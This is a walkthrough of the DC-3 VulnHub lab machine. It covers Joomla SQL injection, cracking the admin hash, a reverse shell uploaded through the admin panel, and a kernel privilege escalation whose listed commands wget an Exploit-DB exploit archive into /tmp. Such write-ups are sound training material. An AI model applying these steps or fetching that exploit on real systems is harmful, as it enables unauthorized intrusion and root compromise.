# DC-3 VulnHub Walkthrough

## Nmap Scan

Starting with our **nmap** scan, we found only HTTP open, and after some investigation, we discovered it was running **Joomla! CMS**. Interesting!

![Nmap Scan - Joomla CMS](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img1.png)

## Directory Enumeration

After some directory enumeration, I found the **Joomla! version** in the `README.txt` file. Sometimes this file contains valuable information!

![README.txt](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img2.png)

## Exploiting Joomla!

Next, I searched for known exploits or vulnerabilities for this version of Joomla! I found an **SQL injection** vulnerability. I used a Python script to exploit it (you could also use **sqlmap** for this), and I was able to extract the **admin hash**. I cracked the hash using **John the Ripper**.

![Admin Hash](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img3.png)

## Joomla! Admin Access & Reverse Shell

After cracking the admin hash, I logged into Joomla! and searched for entry points to upload a **reverse shell**. I successfully injected my reverse shell and gained a reverse shell on the system.

![Joomla Admin](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img4.png)
![Reverse Shell Setup](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img5.png)
![Getting Reverse Shell](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img6.png)
![Reverse Shell Obtained](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img7.png)

## Privilege Escalation

Initially, there was only one flag in the root directory mention in the website. I started my enumeration using **LinPEAS** and found that the system was running a vulnerable kernel version.

![LinPEAS Output - Vulnerable Kernel](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img8.png)

I researched the kernel vulnerability and found an exploit in **Exploit-DB**. The following commands were used to exploit the kernel and gain root privileges.

### Commands Used:
1. `cd /tmp`
2. `wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip`
3. `unzip 39772.zip`
4. `cd 39772`
5. `tar -xf exploit.tar`
6. `cd ebpf_mapfd_doubleput_exploit`
7. `ls`

After running the exploit, we successfully obtained a root shell.

![Root Shell Obtained](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img9.png)
![Root Shell - Final Flag](https://github.com/sagar-sehrawat/VulnHub-Machine-Solutions/blob/main/DC-3/img/img10.png)


- **Author**: Sagar Sehrawat  


